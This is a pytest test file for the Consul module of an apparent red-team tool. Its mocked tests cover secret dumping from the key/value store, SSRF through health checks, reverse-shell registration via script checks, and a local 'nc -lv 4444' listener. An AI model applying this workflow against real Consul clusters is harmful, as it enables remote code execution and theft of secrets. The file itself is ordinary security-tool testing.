        "anonymous_scopes": _scope_fixture(False, False, False),
        "auth_scopes": _scope_fixture(True, True, True),
        "scheme": "https",
        "tls_auto_insecure": True,
        "local_script_checks": True,
        "remote_script_checks": True,
        "rce": True,
        "dump_requested": True,
        "dump_all_requested": True,
        "keys_requested": True,
        "kv_dump_items": [{"key": "secret/app", "value": "topsecret"}],
        "services_list_requested": True,
        "services_list_source": "auth",
        "services_list": [{"name": "web"}],
        "service_instances": {
            "web": [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {"check_id": "service:web-1", "name": "web", "status": "passing", "output": "HTTP 200 OK"}
                    ],
                }
            ]
        },
        "service_instances_errors": {},
        "agents_list_requested": True,
        "agents_list_source": "auth",
        "agents_list": [
            {"name": "node-1", "addr": "10.0.0.10", "dc": "dc1", "role": "server", "port": 8301, "status": "alive"}
        ],
        "checks_list_requested": True,
        "checks_list_source": "auth",
        "checks_list": [
            {
                "check_id": "service:web-1",
                "name": "web",
                "status": "passing",
                "service_id": "web-1",
                "output": "HTTP 200 OK",
            }
        ],
        "nodes_list_requested": True,
        "nodes_list_source": "auth",
        "nodes_list": [{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}],
        "service_result": {"name": "redposture", "action": "delete", "ok": False, "error": "denied", "status": 403},
        "ssrf_results": [
            {
                "target_url": "http://127.0.0.1:9100/metrics",
                "registered": True,
                "status": "passing",
                "output": "HTTP 200 OK",
                "deregistered": False,
                "deregister_error": "denied",
            }
        ],
        "script_revshell": {
            "action": "delete",
            "target_check_id": "rp-revshell",
            "queried": True,
            "matched": 1,
            "deleted": 0,
            "items": [{"check_id": "rp-revshell", "ok": False, "error": "denied"}],
        },
    }

    lines = consul._detail_lines(record, "txt", debug=True)
    text = "\n".join(lines)
    assert "[*] Agent Checks" in text
    assert "[*] Nodes" in text
    assert "[*] SSRF Check" in text
    assert "service delete failed err=denied status=403" in text
    assert "Reverse-shell cleanup (check_id:rp-revshell)" in text


def test_put_helpers_and_misc_error_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_request_with_tls_fallback(
        _host: str,
        _port: int,
        method: str,
        path: str,
        _timeout: float,
        *,
        use_https: bool,
        insecure: bool,
        headers: dict[str, str] | None = None,
        body: bytes | None = None,
    ):
        _ = (use_https, insecure, headers, body)
        if method == "PUT" and path == "/v1/ok":
            return 200, b'{"ok":true}', {}, None, False, False
        if method == "PUT" and path == "/v1/nobody":
            return 204, b"", {}, None, False, False
        if method == "PUT" and path == "/v1/fail":
            return 500, b'{"error":"boom"}', {}, None, False, False
        pytest.fail(f"unexpected {method} {path}")

    monkeypatch.setattr(consul, "_request_with_tls_fallback", fake_request_with_tls_fallback)

    status, payload, error = consul._consul_put_json(
        "127.0.0.1",
        8500,
        "/v1/ok",
        1.0,
        {"x": 1},
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert (status, payload, error) == (200, {"ok": True}, None)

    status, error = consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/nobody",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert (status, error) == (204, None)

    status, error = consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/fail",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert status == 500
    assert error == '{"error":"boom"}'

    assert consul._revshell_wait_seconds(0.1) >= 12.0
    assert consul._consul_error_detail_text({"x": 1}) == '{"x":1}'
    assert consul._consul_error_detail_text(["a", "b"]) == '["a","b"]'
    assert consul._consul_error_detail_text("  denied  ") == "denied"


def test_consul_inventory_builders_cover_checks_kv_members_nodes_and_health(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):
        path = args[2]
        if path == "/v1/agent/checks":
            return (
                200,
                {
                    "service:web-1": {
                        "Name": "web",
                        "Status": "passing",
                        "ServiceID": "web-1",
                        "Definition": {"HTTP": "http://10.0.0.20:8080/health", "Interval": "10s"},
                        "Args": ["curl", "-fsS", "http://10.0.0.20:8080/health"],
                    }
                },
                None,
                False,
                False,
            )
        if path == "/v1/kv/?keys&recurse":
            return 200, ["secret/app", "config/api"], None, False, False
        if path == "/v1/kv/?recurse":
            return (
                200,
                [{"Key": "secret/app", "Value": base64.b64encode(b"topsecret").decode("ascii"), "Flags": 1}],
                None,
                False,
                False,
            )
        if path == "/v1/agent/members":
            return (
                200,
                [
                    {
                        "Name": "node-1",
                        "Addr": "10.0.0.10",
                        "Port": 8301,
                        "Status": "alive",
                        "Tags": {"role": "server", "dc": "dc1"},
                    }
                ],
                None,
                False,
                False,
            )
        if path == "/v1/catalog/nodes":
            return 200, [{"Node": "node-1", "Address": "10.0.0.10", "Datacenter": "dc1"}], None, False, False
        if path == "/v1/health/service/web":
            return (
                200,
                [
                    {
                        "Node": {"Node": "node-1", "Address": "10.0.0.10", "Datacenter": "dc1"},
                        "Service": {
                            "ID": "web-1",
                            "Address": "10.0.0.20",
                            "Port": 8080,
                            "Meta": {"team": "sre"},
                        },
                        "Checks": [
                            {"CheckID": "service:web-1", "Name": "web", "Status": "passing", "ServiceID": "web-1"}
                        ],
                    }
                ],
                None,
                False,
                False,
            )
        pytest.fail(f"unexpected path: {path}")

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)

    checks_status, checks_payload, checks_error = consul._consul_get_checks(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert checks_status == 200
    assert checks_error is None
    parsed_checks = consul._consul_agent_checks_list(checks_payload or {})
    assert parsed_checks[0]["check_id"] == "service:web-1"
    assert parsed_checks[0]["http"] == "http://10.0.0.20:8080/health"
    assert parsed_checks[0]["script"] == "<from args> curl -fsS http://10.0.0.20:8080/health"

    kv_keys, kv_keys_error = consul._consul_kv_keys_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert kv_keys_error is None
    assert kv_keys == ["config/api", "secret/app"]

    kv_dump, kv_dump_error = consul._consul_kv_dump("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
    assert kv_dump_error is None
    assert kv_dump == [{"key": "secret/app", "value": "topsecret", "flags": 1, "modify_index": None}]

    members, members_error = consul._consul_agent_members_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert members_error is None
    assert members == [
        {"name": "node-1", "addr": "10.0.0.10", "port": 8301, "status": "alive", "role": "server", "dc": "dc1"}
    ]

    nodes, nodes_error = consul._consul_catalog_nodes_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert nodes_error is None
    assert nodes == [{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}]

    service_instances, service_instances_error = consul._consul_health_service_instances(
        "127.0.0.1",
        8500,
        "web",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        agent_checks={"service:web-1": checks_payload["service:web-1"]},
    )
    assert service_instances_error is None
    assert service_instances == [
        {
            "service_name": "web",
            "node_name": "node-1",
            "node_address": "10.0.0.10",
            "node_datacenter": "dc1",
            "service_id": "web-1",
            "service_address": "10.0.0.20",
            "service_port": 8080,
            "meta": {"team": "sre"},
            "checks": [
                {
                    "check_id": "service:web-1",
                    "name": "web",
                    "status": "passing",
                    "service_id": "web-1",
                    "notes": None,
                    "output": None,
                    "args": ["curl", "-fsS", "http://10.0.0.20:8080/health"],
                    "script": "<from args> curl -fsS http://10.0.0.20:8080/health",
                    "type": None,
                    "http": "http://10.0.0.20:8080/health",
                    "tcp": None,
                    "grpc": None,
                    "method": None,
                    "interval": "10s",
                    "timeout": None,
                    "ttl": None,
                    "deregister_after": None,
                    "namespace": None,
                    "partition": None,
                    "definition_raw": '{"HTTP":"http://10.0.0.20:8080/health","Interval":"10s"}',
                }
            ],
        }
    ]


def test_service_action_and_revshell_cleanup(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):
        path = args[2]
        if path == "/v1/agent/services":
            return 200, {"svc-1": {"Service": "web", "ID": "svc-1"}}, None, False, False
        pytest.fail(f"unexpected path: {path}")

    put_calls: list[str] = []

    def fake_put_no_body(
        _host: str,
        _port: int,
        path: str,
        _timeout: float,
        *,
        scheme: str,
        insecure: bool,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str | None]:
        _ = (scheme, insecure, headers)
        put_calls.append(path)
        if path.endswith("/svc-1"):
            return 200, None
        return 403, "denied"

    def fake_put_json(
        _host: str,
        _port: int,
        path: str,
        _timeout: float,
        payload: dict[str, object],
        *,
        scheme: str,
        insecure: bool,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, object, str | None]:
        _ = (scheme, insecure, headers)
        assert path == "/v1/agent/service/register"
        assert payload["Name"] == "web"
        return 200, None, None

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)
    monkeypatch.setattr(consul, "_consul_put_no_body", fake_put_no_body)
    monkeypatch.setattr(consul, "_consul_put_json", fake_put_json)

    delete_result = consul._consul_service_action(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        service_name="web",
        delete=True,
    )
    assert delete_result["ok"] is True
    assert delete_result["id"] == "svc-1"
    assert put_calls[-1].endswith("/svc-1")

    create_result = consul._consul_service_action(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        service_name="web",
        delete=False,
        service_args="--dump",
    )
    assert create_result["ok"] is True
    assert create_result["status"] == 200

    monkeypatch.setattr(
        consul,
        "_consul_get_checks",
        lambda *_args, **_kwargs: (
            200,
            {"rev-rp-a": {}, "keep": {}, "rev-rp-b": {}},
            None,
        ),
    )
    cleanup_result = consul._consul_script_revshell_cleanup(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert cleanup_result["matched"] == 2
    assert cleanup_result["deleted"] == 0
    assert {item["check_id"] for item in cleanup_result["items"]} == {"rev-rp-a", "rev-rp-b"}


@pytest.mark.parametrize(
    ("overrides", "expected_message"),
    [
        ({"timeout": 0}, "--timeout must be > 0"),
        ({"retries": -1}, "--retries must be >= 0"),
        ({"ssrf_port": "8080"}, "--ssrf-port/--ssrf-path require --ssrf-target"),
        ({"ssrf_target": "127.0.0.1", "ssrf_port": "bad-port"}, "failed to parse --ssrf-port"),
        ({"kv_key": "secret/app"}, "--key requires --dump"),
        ({"service_dump_name": "web"}, "--service requires --dump"),
        ({"agent_name": "agent-1"}, "--agent requires --dump"),
        ({"node_name": "node-1"}, "--node requires --dump"),
        ({"delete_revshell": True}, "--delete requires --revshell or --check-id"),
        ({"revshell_check_id": "id:"}, "--check-id id:<value> requires a non-empty check id"),
        ({"revshell_check_id": "rp-1"}, "--check-id requires --revshell, --delete, or --dump"),
        ({"revshell_listen": True}, "--listen requires --revshell"),
        ({"revshell": True, "revshell_listen": True}, "--listen requires --lport"),
        ({"revshell": True}, "--lhost is required when --revshell is set"),
        (
            {"revshell": True, "revshell_host": "bad host!", "revshell_port": 4444},
            "--lhost must be a plain IPv4/DNS hostname",
        ),
    ],
)
def test_run_consul_stage_validation_errors(
    monkeypatch: pytest.MonkeyPatch, overrides: dict[str, object], expected_message: str
) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    rc = consul.run_consul_stage(_consul_args(**overrides), logger=object())
    assert rc == 2
    assert any(expected_message in msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "error")


def test_run_consul_stage_warns_for_token_override_and_unreachable_targets(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    captured: list[dict[str, object]] = []

    def fake_audit_targets(**kwargs):
        captured.append(kwargs)
        if kwargs.get("command_progress") is not None:
            kwargs["command_progress"].advance(len(kwargs.get("hosts", [])))
        return 1, 0, 1, False

    patch_runner_for_legacy_target_fake(monkeypatch, "consul", fake_audit_targets)
    rc = consul.run_consul_stage(
        _consul_args(token="root", username="alice", password="secret"),
        logger=object(),
    )
    assert rc == 0
    assert captured and captured[0]["username"] is None and captured[0]["password"] is None
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--token is set; Basic auth credentials are ignored" in msg for msg in warnings)
    assert not any("all consul targets are unreachable" in msg for msg in warnings)


def test_run_consul_stage_listener_path_starts_local_listener(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    patch_runner_for_legacy_target_fake(monkeypatch, "consul", lambda **_kwargs: (1, 1, 0, True))

    class _FakePopen:
        def wait(self) -> int:
            return 0

    monkeypatch.setattr(consul.subprocess, "Popen", _FakePopen)
    monkeypatch.setattr(
        consul,
        "_start_local_nc_listener",
        lambda _port: {"started": True, "cmd": "nc -lv 4444", "pid": 1234, "process": _FakePopen()},
    )

    rc = consul.run_consul_stage(
        _consul_args(revshell=True, revshell_listen=True, revshell_host="127.0.0.1", revshell_port=4444),
        logger=object(),
    )
    assert rc == 0
    infos = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "info"]
    assert any("local listener started" in msg for msg in infos)


def test_run_consul_stage_dump_flag_inference_and_listener_warnings(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    captured: list[dict[str, object]] = []

    def fake_audit_targets(**kwargs):
        captured.append(kwargs)
        if kwargs.get("command_progress") is not None:
            kwargs["command_progress"].advance(len(kwargs.get("hosts", [])))
        return 1, 1, 0, False

    patch_runner_for_legacy_target_fake(monkeypatch, "consul", fake_audit_targets)
    rc = consul.run_consul_stage(
        _consul_args(
            debug=True,
            dump=True,
            service_dump_name="web",
            agent_name="node-1",
            node_name="node-1",
            revshell=True,
            revshell_listen=True,
            revshell_host="127.0.0.1",
            revshell_port=4444,
            revshell_check_id="id:rp-check",
            ports="8500,18500",
        ),
        logger=object(),
    )
    assert rc == 0
    assert len(captured) == 2
    assert captured[0]["service_dump_name"] == "web"
    assert captured[0]["show_services"] is True
    assert captured[0]["show_agents"] is True
    assert captured[0]["show_nodes"] is True
    assert captured[0]["show_checks"] is True
    assert captured[0]["check_dump_id"] == "rp-check"
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--listen starts one local listener for all selected targets/ports" in msg for msg in warnings)
    assert any("local listener not started: revshell check was not registered" in msg for msg in warnings)


def test_run_consul_stage_returns_error_when_target_audit_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    monkeypatch.setattr(consul, "collect_scan_targets", lambda *_args, **_kwargs: ["127.0.0.1"])
    patch_runner_for_legacy_target_fake(
        monkeypatch, "consul", lambda **_kwargs: (_ for _ in ()).throw(OSError("broken pipe"))
    )
    rc = consul.run_consul_stage(_consul_args(), logger=object())
    assert rc == 2
    assert any(
        "failed to process consul output: broken pipe" in msg
        for level, msg in _ConsoleCapture.instances[-1].messages
        if level == "error"
    )


def test_run_consul_stage_warn_paths_for_revshell_args(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])
    patch_runner_for_legacy_target_fake(monkeypatch, "consul", lambda **_kwargs: (1, 1, 0, False))

    rc_payload = consul.run_consul_stage(
        _consul_args(revshell=True, revshell_host="127.0.0.1", revshell_port=4444, revshell_payload="id"),
        logger=object(),
    )
    assert rc_payload == 0
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--lhost/--lport ignored when --payload is set" in msg for msg in warnings)

    _ConsoleCapture.instances.clear()
    rc_delete = consul.run_consul_stage(
        _consul_args(
            revshell=True,
            delete_revshell=True,
            revshell_host="127.0.0.1",
            revshell_port=4444,
            revshell_payload="custom",
        ),
        logger=object(),
    )
    assert rc_delete == 0
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--lhost/--lport ignored with --revshell --delete" in msg for msg in warnings)
    assert any("--payload ignored with --revshell --delete" in msg for msg in warnings)

    _ConsoleCapture.instances.clear()
    rc_plain_delete = consul.run_consul_stage(
        _consul_args(
            delete_revshell=True,
            revshell_check_id="rp-check",
            revshell_host="127.0.0.1",
            revshell_port=4444,
            revshell_payload="custom",
        ),
        logger=object(),
    )
    assert rc_plain_delete == 0
    warnings = [msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "warn"]
    assert any("--lhost/--lport ignored with --delete --check-id" in msg for msg in warnings)
    assert any("--payload ignored with --delete --check-id" in msg for msg in warnings)


def test_run_consul_stage_target_parse_and_ssrf_empty_errors(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_args, **_kwargs: [])

    rc_targets = consul.run_consul_stage(_consul_args(targets="http://"), logger=object())
    assert rc_targets == 2
    assert any(
        "failed to parse targets:" in msg for level, msg in _ConsoleCapture.instances[-1].messages if level == "error"
    )

    _ConsoleCapture.instances.clear()
    monkeypatch.setattr("redposture_core.modules.consul.policy._normalize_ssrf_urls", lambda *_args, **_kwargs: [])
    rc_ssrf = consul.run_consul_stage(_consul_args(ssrf_target="127.0.0.1"), logger=object())
    assert rc_ssrf == 2
    assert any(
        "no valid SSRF targets generated" in msg
        for level, msg in _ConsoleCapture.instances[-1].messages
        if level == "error"
    )


def test_consul_get_json_any_and_probe_scheme_fallbacks(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul, "_request_with_tls_fallback", lambda *_a, **_k: (0, b"", {}, "broken pipe", False, False)
    )
    status, payload, error, effective, tls_auto = consul._consul_get_json_any(
        "127.0.0.1",
        8500,
        "/v1/status/leader",
        1.0,
        use_https=False,
        insecure=False,
        headers=None,
    )
    assert (status, payload, error, effective, tls_auto) == (0, None, "broken pipe", False, False)

    monkeypatch.setattr(
        consul, "_request_with_tls_fallback", lambda *_a, **_k: (200, b"plain-text", {}, None, False, False)
    )
    status2, payload2, error2, _, _ = consul._consul_get_json_any(
        "127.0.0.1",
        8500,
        "/v1/status/leader",
        1.0,
        use_https=False,
        insecure=False,
        headers=None,
    )
    assert status2 == 200 and error2 is None
    assert payload2 == "plain-text"

    responses = iter(
        [
            (403, b'"permission denied"', {}, None, False, False),
        ]
    )
    monkeypatch.setattr(consul, "_request_with_tls_fallback", lambda *_a, **_k: next(responses))
    detected = consul._probe_consul_scheme("127.0.0.1", 8500, 1.0, preferred_scheme="https")
    assert detected[0] is True
    assert detected[1] == "https"


def test_consul_catalog_and_kv_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (401, None, None, False, False))
    services, services_error = consul._consul_catalog_services_list(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert services is None
    assert services_error == "Unauthorized"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, {}, None, False, False))
    kv_keys, kv_keys_error = consul._consul_kv_keys_list(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert kv_keys is None
    assert kv_keys_error == "invalid kv keys response"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (404, None, None, False, False))
    kv_dump, kv_dump_error = consul._consul_kv_dump(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        key_name="missing/key",
    )
    assert kv_dump == []
    assert kv_dump_error is None


def test_consul_ssrf_probe_register_poll_and_cleanup_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    check_id = "redposture-ssrf-abcdefghij"
    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: (200, {}, None))
    checks_responses = iter(
        [
            (200, {"id": "skip"}, None),
            (
                200,
                {
                    check_id: {
                        "Status": "passing",
                        "Output": "HTTP 200",
                    }
                },
                None,
            ),
        ]
    )

    def fake_get_checks(*_args, **_kwargs):
        return next(checks_responses)

    put_calls: list[str] = []

    def fake_put_no_body(*_args, **_kwargs):
        put_calls.append("deregister")
        return 204, None

    monotonic_values = iter([0.0, 0.1, 0.2, 0.3, 5.0])
    monkeypatch.setattr(consul, "_consul_get_checks", fake_get_checks)
    monkeypatch.setattr(consul, "_consul_put_no_body", fake_put_no_body)
    monkeypatch.setattr(consul.time, "sleep", lambda _x: None)
    monkeypatch.setattr(consul.time, "monotonic", lambda: next(monotonic_values))
    monkeypatch.setattr(consul.time, "time_ns", lambda: 12345)
    monkeypatch.setattr(consul.base64, "urlsafe_b64encode", lambda _b: b"abcdefghij")

    result = consul._consul_ssrf_probe(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        target_url="http://127.0.0.1:9100/metrics",
    )
    assert result["registered"] is True
    assert result["check_id"] == check_id
    assert result["status"] == "passing"
    assert result["output"] == "HTTP 200"
    assert result["deregistered"] is True
    assert put_calls

    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: (500, {}, None))
    failed_register = consul._consul_ssrf_probe(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        target_url="http://127.0.0.1:9100/metrics",
    )
    assert failed_register["registered"] is False
    assert "status=500" in str(failed_register["register_error"])


def test_consul_script_revshell_and_cleanup_branches(monkeypatch: pytest.MonkeyPatch) -> None:
    missing_target = consul._consul_script_revshell(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        lhost=None,
        lport=None,
        payload_cmd=None,
        check_id="rp-check",
    )
    assert missing_target["attempted"] is False
    assert "missing revshell target" in str(missing_target["register_error"])

    put_json_responses = iter(
        [
            (400, {"error": "Script not allowed"}, None),
            (204, {}, None),
        ]
    )
    monkeypatch.setattr(consul, "_consul_put_json", lambda *_a, **_k: next(put_json_responses))
    revshell = consul._consul_script_revshell(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        lhost="127.0.0.1",
        lport=4444,
        payload_cmd=None,
        check_id="rp-check",
        wait_after_register=False,
    )
    assert revshell["registered"] is True
    assert revshell["register_mode"] == "Args"
    assert revshell["wait_seconds"] == 0.0

    monkeypatch.setattr(consul, "_consul_get_checks", lambda *_a, **_k: (200, {"rp-check": {}}, None))
    monkeypatch.setattr(consul, "_consul_put_no_body", lambda *_a, **_k: (500, None))
    cleanup = consul._consul_script_revshell_cleanup(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        check_id="rp-check",
    )
    assert cleanup["queried"] is True
    assert cleanup["matched"] == 1
    assert cleanup["deleted"] == 0
    assert cleanup["items"][0]["ok"] is False


def test_start_local_nc_listener_branch_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(consul.shutil, "which", lambda *_a, **_k: None)
    monkeypatch.setattr(consul.time, "sleep", lambda _x: None)

    def raise_not_found(*_a, **_k):
        raise FileNotFoundError

    monkeypatch.setattr(consul.subprocess, "Popen", raise_not_found)
    not_found = consul._start_local_nc_listener(4444)
    assert not_found["started"] is False
    assert "not found" in str(not_found["error"])

    def raise_oserror(*_a, **_k):
        raise OSError("permission denied")

    monkeypatch.setattr(consul.subprocess, "Popen", raise_oserror)
    os_error = consul._start_local_nc_listener(4444)
    assert os_error["started"] is False
    assert "permission denied" in str(os_error["error"])

    class _ProcDone:
        pid = 111

        def poll(self) -> int | None:
            return 1

    monkeypatch.setattr(consul.subprocess, "Popen", lambda *_a, **_k: _ProcDone())
    done = consul._start_local_nc_listener(4444)
    assert done["started"] is False
    assert "exited rc=1" in str(done["error"])

    class _ProcRunning:
        pid = 222

        def poll(self) -> int | None:
            return None

    monkeypatch.setattr(consul.subprocess, "Popen", lambda *_a, **_k: _ProcRunning())
    running = consul._start_local_nc_listener(4444)
    assert running["started"] is True
    assert running["pid"] == 222


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("[Errno 113] No route to host", "network unreachable"),
        ("temporary failure in name resolution", "dns lookup temporary failure"),
        ("SSL HTTP REQUEST", "tls/http protocol mismatch"),
        ("operation not permitted", "operation not permitted by local environment"),
        ("[Errno 999] custom detail", "custom detail"),
    ],
)
def test_friendly_error_text_additional_branches(raw: str, expected: str) -> None:
    assert consul._friendly_error_text(raw) == expected


def test_scope_probe_and_agent_self_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (0, None, "broken pipe", False, False))
    probe_error = consul._scope_probe(
        "127.0.0.1",
        8500,
        "/v1/catalog/services",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        count_fn=lambda _payload: 1,
    )
    assert probe_error["ok"] is False
    assert probe_error["error"] == "broken pipe"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (403, {"x": 1}, None, False, False))
    probe_forbidden = consul._scope_probe(
        "127.0.0.1",
        8500,
        "/v1/catalog/services",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        count_fn=lambda _payload: 1,
    )
    assert probe_forbidden["error"] == "Forbidden"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (500, {"x": 1}, None, False, False))
    probe_unexpected = consul._scope_probe(
        "127.0.0.1",
        8500,
        "/v1/catalog/services",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        count_fn=lambda _payload: 1,
    )
    assert "unexpected status=500" in str(probe_unexpected["error"]) or "{'x': 1}" in str(probe_unexpected["error"])

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (401, {}, None, False, False))
    self_unauth = consul._agent_self_probe("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
    assert self_unauth["ok"] is False
    assert self_unauth["error"] == "Unauthorized"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, "bad", None, False, False))
    self_invalid = consul._agent_self_probe("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
    assert self_invalid["ok"] is False
    assert self_invalid["error"] == "unexpected status=200"


def test_consul_access_matrix_invokes_three_probes(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []

    def fake_scope_probe(
        _host: str,
        _port: int,
        path: str,
        _timeout: float,
        *,
        scheme: str,
        insecure: bool,
        headers: dict[str, str] | None = None,
        count_fn,
    ) -> dict[str, Any]:
        _ = (scheme, insecure, headers, count_fn)
        calls.append(path)
        return {"ok": True, "status": 200, "count": 1, "error": None}

    monkeypatch.setattr(consul, "_scope_probe", fake_scope_probe)
    scopes = consul._consul_access_matrix("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
    assert set(scopes.keys()) == {"kv", "services", "agents"}
    assert calls == ["/v1/kv/?keys&recurse", "/v1/catalog/services", "/v1/agent/members"]


def test_audit_consul_host_core_with_rich_flow(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_a, **_k: (True, "http", False, False, "127.0.0.1:8300", None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_access_matrix",
        lambda *_a, headers=None, **_k: (
            _scope_fixture(False, False, False) if headers is None else _scope_fixture(True, True, True)
        ),
    )
    monkeypatch.setattr(
        consul,
        "_agent_self_probe",
        lambda *_a, headers=None, **_k: (
            {"ok": False, "error": "denied", "version": None, "local_script_checks": None, "remote_script_checks": None}
            if headers is None
            else {
                "ok": True,
                "error": None,
                "version": "1.17.3",
                "local_script_checks": True,
                "remote_script_checks": True,
            }
        ),
    )
    monkeypatch.setattr(consul, "_consul_kv_keys_list", lambda *_a, **_k: (["a", "b"], None))
    monkeypatch.setattr(
        consul,
        "_consul_kv_dump",
        lambda *_a, **_k: ([{"key": "secret/app", "value": "v", "flags": 0, "modify_index": 1}], None),
    )
    monkeypatch.setattr(consul, "_consul_catalog_services_list", lambda *_a, **_k: ([{"name": "web"}], None))
    monkeypatch.setattr(consul, "_consul_get_checks", lambda *_a, **_k: (200, {"service:web": {}}, None))
    monkeypatch.setattr(
        consul,
        "_consul_health_service_instances",
        lambda *_a, **_k: ([{"node_name": "n1", "service_id": "web-1", "checks": []}], None),
    )
    monkeypatch.setattr(consul, "_consul_agent_members_list", lambda *_a, **_k: ([{"name": "n1"}], None))
    monkeypatch.setattr(consul, "_consul_catalog_nodes_list", lambda *_a, **_k: ([{"name": "n1"}], None))
    monkeypatch.setattr(
        consul, "_consul_service_action", lambda *_a, **_k: {"name": "svc", "action": "delete", "ok": True}
    )
    monkeypatch.setattr(
        consul,
        "_consul_ssrf_probe",
        lambda *_a, **_k: {"target_url": "http://t", "registered": True, "status": "passing", "deregistered": True},
    )
